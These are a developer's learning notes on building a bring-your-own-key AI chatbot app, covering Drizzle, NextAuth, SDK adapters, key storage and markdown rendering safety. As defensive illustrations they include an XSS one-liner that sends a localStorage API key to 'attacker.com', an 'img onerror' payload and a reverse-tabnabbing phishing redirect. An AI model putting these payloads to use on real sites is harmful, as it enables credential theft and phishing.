# ProBot - Learnings

> Summary of my learnings while building this project from scratch and how I plan to incrementally build the product in stages.

## Overview

This document outlines a learning plan for building ProBot, an AI-powered chatbot platform. The plan is structured in stages, with each stage introducing new features and improvements while ensuring that the core functionality is available from the very beginning.

**Key Principle**: Learn by doing. The best way to understand how to build ProBot is to start building it, even if the initial version is very basic.

### 1. Drizzle ORM and PostgreSQL

> What is Drizzle and why use it?

Drizzle is a schema-first, type-safe SQL toolkit (not an ORM in the heavy ActiveRecord sense). Two layers:

- Schema layer (schema.ts): you declare pgTable("users", { id: uuid("id").primaryKey() ... }). This is not just types — it's a runtime metadata object Drizzle uses for both (a) generating SQL migrations (via drizzle-kit) and (b) building type-safe queries (via drizzle-orm).
- Query layer (index.ts): db.select().from(users).where(eq(users.email, "x")) — every column reference is type-checked against the schema. The return type of db.query.users.findFirst() is User | undefined inferred from the schema — no separate type declarations.

The $inferSelect / $inferInsert helpers expose those inferred types so other modules (NextAuth in Task 1.3, the chat API in Task 1.8) can import User without re-typing the schema.

The pg.Pool is a connection pool — it keeps a small set of TCP connections open to Postgres and hands them out per query, avoiding the cost of opening a new connection every request. In Next.js, the pool is created once per server instance (singleton in index.ts).

> How Drizzle's type inference works?

pgTable("users", { id: uuid("id").primaryKey().defaultRandom(), ... }) returns a runtime metadata object and a TypeScript type carrier. typeof users.$inferSelect extracts the row shape as it comes back from a SELECT (so id is string, createdAt is Date, optional columns are T | null). typeof users.$inferInsert extracts the insert shape (columns with defaults become optional — you don't have to provide id, createdAt, llmProvider, etc.). These types flow through every Drizzle query — db.query.users.findFirst() returns User | undefined without you writing a single type annotation. This is the same idea as Prisma but without code generation — pure inference.

Why the pg.Pool is lazy: new Pool({ connectionString: undefined }) does not error. The pool stores config and waits — it only opens its first TCP connection when pool.query() or pool.connect() is called. That lets import { db } from "@/lib/db" succeed at build time even with no DATABASE_URL set, and fail loudly only when the first real query runs. Compare to a strict pattern where the import itself would throw: that would break next build for any module that transitively imports db, even on a code path that doesn't actually query.

Why gen_random_uuid() works without pgcrypto: Postgres ≥ 13 ships gen_random_uuid() built-in. Supabase, Neon, and modern local installs all qualify. Drizzle's .defaultRandom() emits DEFAULT gen_random_uuid() in the migration SQL — no extension migration needed.

---

### JWT Authentication with NextAuth

> Why JWT for Stage 1, not DB sessions?

With NextAuth's Credentials provider, the only real choice is JWT — Credentials doesn't ship with a DB-sessions story (you'd have to roll your own session table + adapter). JWT means: at login, NextAuth signs a JSON Web Token containing the user id (and whatever else we put in it) using NEXTAUTH_SECRET. The token rides in an HTTP-only cookie. On every request, NextAuth verifies the signature without touching the DB — fast and stateless. The tradeoff: you can't revoke a JWT before it expires (sessions are bounded by the JWT's exp claim, default 30 days). For Stage 1 this is fine; Stage 7 can short-shorten the JWT TTL or add an in-memory blocklist if needed.

Why bcrypt and not Argon2? Argon2 is technically stronger, but bcrypt / bcryptjs is the standard for Node app auth and is what NextAuth examples use. Bcrypt's known-quantity threat model — slow comparison via cost factor, salt baked into the hash string — is sufficient. The cost factor controls how slow each hash is (each +1 doubles the time); 10 ≈ 100ms per hash, which is the right "fast for users, slow for attackers" balance.

Why does the username validation matter NOW even though the public URL isn't live? The users.username column has UNIQUE NOT NULL — every registered user has one stored. If we let Jane.Doe register today, then in Stage 4 we add a route app/u/[username]/chat/page.tsx and someone navigates to /u/Jane.Doe/chat, two problems: (1) URLs are case-sensitive on most CDNs — Jane.Doe ≠ jane.doe, (2) the . could collide with a reserved Next.js route segment. Enforcing the regex at the gate is the easiest fix.

---

### Route Groups

> Why a route-group layout?

src/app/(auth)/layout.tsx is rendered for both /login and /register but not for /, /dashboard, etc. The parens make (auth) a route group — purely organizational, never appears in the URL. So the shared chrome (left brand panel, container, fonts) renders once and only the page content swaps as you navigate between /login and /register. Faster transitions, less duplicated JSX, and the URL stays clean.

Why next/font/google over CDN? With CDN, the browser does: (1) parse HTML, (2) discover <link>, (3) DNS-lookup + connect to fonts.googleapis.com, (4) fetch CSS, (5) discover font URL, (6) DNS-lookup + connect to fonts.gstatic.com, (7) fetch WOFF2, (8) finally render text. With next/font/google, Next downloads the fonts at build time, hashes them, serves them from your own origin, and inlines @font-face declarations into your CSS — text renders on first paint with no FOUC. Bonus: GDPR-friendly (no third-party hit), and it works in offline / restricted-network deployments.

Why auto-sign-in after register? Two separate round-trips would force users to type their password twice (once to register, once to log in). The POST /api/auth/register returns 201 with the user, then the client calls signIn('credentials', ...) with the same email/password — the user goes register → dashboard in one motion. Per srs.md §5.1.1's CTA "Create Your Bot in 2 Minutes," friction here is a goal-state.

---

### Multi-Provider LLM Adapters (BYO-Key)

> Why does each `complete()` call construct a brand-new SDK client instead of caching one?

A normal single-tenant app does `const client = new Anthropic({ apiKey: process.env.ANTHROPIC_API_KEY })` once at module load — the client object holds the key plus a configured `fetch` wrapper, and you reuse it for every request. ProBot can't. This is a **BYO-key** product: request A from user Jane carries Jane's Anthropic key in the `x-llm-api-key` header; request B one millisecond later from user Bob carries Bob's. There is no single "the" key. A cached singleton would either pin to one user's key forever (wrong) or require mutating a shared object's auth state between requests (race-condition heaven — request A could send Jane's prompt with Bob's key if the mutation interleaves with the in-flight HTTPS call). The fix is dead simple: construct a fresh `new Anthropic({ apiKey })` per request. SDK construction is cheap — the constructor just stores the key in a private field and prepares a `fetch` wrapper; it does **not** open any network connection. The HTTPS request happens later, on `client.messages.create()`. So "per-request client" really means "per-request 50-byte object that closes over the right key" — zero performance cost, total isolation.

> Why does `import Anthropic from "@anthropic-ai/sdk"` then `Anthropic.APIError` blow up under Vitest mocks, while `import Anthropic, { APIError } from "@anthropic-ai/sdk"` survives?

The Anthropic SDK exports both a default (the `Anthropic` class) and named siblings (`APIError`, `AuthenticationError`, `RateLimitError`, …). For convenience, the SDK also attaches the error classes as **static properties** on the class — so `Anthropic.APIError === APIError` at runtime in production. In tests, the typical Vitest mock looks like `vi.mock("@anthropic-ai/sdk", async () => ({ ...await vi.importActual(...), default: MockClass }))`. This spreads all the named exports (`APIError`, etc.) but replaces `default` with `MockClass`. Production code that says `err instanceof Anthropic.APIError` now resolves to `err instanceof MockClass.APIError` — and `MockClass.APIError` is **undefined**, because the mock class is a hand-rolled stub that doesn't carry the SDK's statics. `instanceof undefined` throws `TypeError: Right-hand side of 'instanceof' is not an object`, and your error-mapping path silently dies. The fix is to import `APIError` as a **named** import (not via the class's static): `import Anthropic, { APIError } from "@anthropic-ai/sdk"` then `err instanceof APIError`. Named imports resolve straight from the module's exports object, which the mock preserves verbatim. Lesson generalizes to any SDK that exposes errors both as named exports and as statics: always reach for the named export — it's resilient against mock shenanigans and it's also one less indirection at runtime.

> Why bound `ProviderError`'s serialized shape with a `toJSON()` override?

`JSON.stringify(errorInstance)` by default walks the object's own enumerable properties — which includes anything else stuck on the error, including a `cause` field (built into modern `Error`) and any custom fields the caller might tack on later. In a BYO-key system this is a leak waiting to happen: imagine a future contributor catches a `ProviderError`, wraps it with `new Error("chat failed", { cause: originalSdkError })`, and a Sentry breadcrumb calls `JSON.stringify(err)`. The original SDK error's `.headers` property — which contains `Authorization: Bearer sk-ant-XXX` — gets serialized into telemetry. Defining `toJSON() { return { name, provider, category, message }; }` bounds the serialized shape to exactly those four fields no matter what callers attach. `JSON.stringify` always honors `toJSON`, so even nested `{ outer: providerError }` gets flattened to the safe shape. The cost is 6 lines of code; the win is that "the key cannot accidentally enter the structured log pipeline" stops being a discipline question (which fails) and becomes a code-enforced invariant (which doesn't).

---

### BYO-Key in the Browser: Per-Origin localStorage as the System of Record

> Why is the user's LLM API key safe in browser `localStorage`, and what would make it NOT safe?

`localStorage` is per-origin (scheme + host + port) and not sent automatically with any request — unlike cookies, which the browser auto-attaches to every request to the origin. That property is what makes `localStorage` correct for a BYO-key value: the key only travels somewhere when *our code explicitly reads it and puts it in a header*. The two ways it could still leak are (a) cross-site scripting (XSS) — if any code on the same origin can run `document.write(<script>fetch("attacker.com?k="+localStorage.getItem("probot.llm.key.v1"))</script>)`, it can exfiltrate the key, which is why every input rendered as HTML (chat replies, bot bios) must NOT use `dangerouslySetInnerHTML` and must go through a sanitizer like react-markdown's default escaping, and (b) shared computers / browser extensions — anything with read access to `localStorage` on the user's machine can see the key. That second one is a fundamental tradeoff of "we never store the key on our server": the convenience of "your key never leaves your device" comes with "anyone with access to your device sees your key." We mitigate (a) with strict CSP + no `dangerouslySetInnerHTML` + react-markdown's escaping; we accept (b) as the cost of zero-trust BYO-key. The alternative — passing the key through ProBot servers — would shift the trust boundary from "the user's device" to "every ProBot deployment", which is exactly what the product is built to avoid.

> Why is the BYO key sent in an HTTP header (`x-llm-api-key`) instead of the JSON body?

Two reasons, both about *accidental* leaks. (1) Server frameworks routinely log request bodies — Sentry breadcrumbs, structured loggers, Vercel's `console.log` capture, even Next.js's own dev-server output sometimes echoes bodies on errors. They almost never log custom request headers by default. Putting the key in a header instead of the body means a careless `console.log(req.body)` somewhere downstream can't leak it. (2) The browser's network inspector treats headers and bodies differently in some integrations (e.g. some analytics tools record body snippets for failed XHR but not headers). The header form puts the key in the smaller, less-touched part of the request. This is defense-in-depth — neither logging nor analytics integration is supposed to record secrets, but the header convention reduces the surface where "supposed to" matters. The chat UI test asserts both halves of this explicitly: `headers["x-llm-api-key"]` equals the key, AND `init.body` (the raw stringified body) does **not** contain the key value as a substring.

---

### React List Reconciliation: Synthetic IDs vs Array Indices

> Why does using `messages.map((m, i) => <Bubble key={i} />)` work fine until it suddenly breaks?

React uses the `key` prop to figure out, between renders, which children are the "same" element so it can preserve DOM, focus, and component state. When `key={i}` (the array index), React thinks index 0 is always "the same element" — even if you've replaced what's at index 0 with a different message. As long as messages are only ever *appended* to the end, this happens to work: the new last item gets a fresh index, no existing index changes, no reconciliation surprises. The moment any operation *mutates a slot* — replacing an optimistic "user message sent" bubble with the actual error retry, splicing a deleted message out of the middle, reordering for relevance — React reuses the wrong DOM nodes. You see things like focus jumping to the wrong textbox, animations playing on the wrong bubble, or — most insidiously — a `useState` inside a bubble component carrying over from a different message and showing stale data. Synthetic IDs (one per insertion, e.g. `crypto.randomUUID()`) fix this because two distinct messages, even at the same array position, get different `key` values; React knows to unmount the old one and mount the new one. The cost is six characters of memory per message. The cost of NOT having them is a class of bugs that only show up when you start mutating mid-list, which is exactly when you stop being able to debug them quickly.

> When IS using the array index as `key` actually fine?

When the list is **truly immutable** in shape — never reordered, never has items spliced out, never has items replaced in place. A nav menu rendered from a hardcoded `const ITEMS = [...]` is fine. A read-only paginated table where each page is a fresh array (no in-place mutation) is fine. Anywhere else, default to synthetic IDs from the moment you create the data, not the moment you render it — generating IDs at render time is also wrong (every render produces new IDs, defeating the point).

---

### Markdown Safety: react-markdown's Default Behavior

> Why doesn't `<ReactMarkdown>{userInput}</ReactMarkdown>` render an `<img onerror="alert(1)">` when the input contains exactly that?

react-markdown parses input as **Markdown** (CommonMark + plugins), not HTML. The parser does not recognize raw HTML elements like `<img>` or `<script>` as renderable tags — by default, anything that looks like an HTML tag is either passed through as escaped text (`&lt;img …&gt;`) or stripped, depending on the plugin chain. So an attacker-supplied `<img src=x onerror=alert(1)>` ends up as the literal string in a `<p>`, not as an active `<img>` element. The DOM never sees an `img` node, so the `onerror` handler never fires. This is fundamentally different from `dangerouslySetInnerHTML={{__html: userInput}}`, which hands the string directly to the browser's HTML parser and runs anything it finds. The protection holds **as long as you don't add `rehype-raw`** — `rehype-raw` opts into rendering raw HTML and immediately re-introduces the XSS path you got rid of. The test that asserts `document.querySelector("img")` returns `null` is what locks this in: any future contributor who adds `rehype-raw` to "get HTML support back" will break that test and have to make a conscious decision instead of an accident.

> Why force every `<a>` through a `SafeLink` component with `rel="noopener noreferrer" target="_blank"`?

`target="_blank"` makes the link open in a new tab — good UX for an AI-generated response that links elsewhere. But `target="_blank"` without `rel="noopener"` creates the **"reverse tabnabbing" vulnerability**: the newly opened page gets a `window.opener` reference back to *your* page, and can do `window.opener.location = "https://phishing-site.example/"` to silently redirect the user's original ProBot tab to a phishing site that looks like ProBot. `rel="noopener"` severs the `window.opener` link so the new tab cannot reach back. `rel="noreferrer"` additionally strips the `Referer` header so the destination doesn't see what page sent the user. Together they are the modern-browser equivalent of "yes, open in a new tab, but with no strings attached." Passing a custom `components={{ a: SafeLink }}` map to ReactMarkdown is the cleanest way to enforce this on **every** link the markdown renderer produces, including ones from future bot output we haven't seen yet — the safety becomes a property of the renderer, not of any individual call site.

---
